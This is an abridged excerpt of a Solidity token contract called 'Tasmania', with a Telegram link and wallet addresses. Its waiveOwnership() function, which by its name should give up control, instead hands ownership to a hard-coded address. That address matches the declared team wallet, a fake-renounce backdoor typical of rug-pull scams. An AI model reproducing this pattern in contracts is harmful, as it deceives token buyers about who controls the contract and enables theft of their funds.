...
TELEGRAM: https://t.me/TasmaniaCoin
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x31cdDf3e350BA777B834A1690F03D8489b662443);
    }
...
contract TASMANIA is Context, IERC20, Ownable {
    ...
    string private _name = "Tasmania";
    string private _symbol = "Tasmania";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x06ee75dDd2E1d1cE199AeE2E34a6B7675A7eeA01);
    address payable public teamWalletAddress = payable(0x31cdDf3e350BA777B834A1690F03D8489b662443);
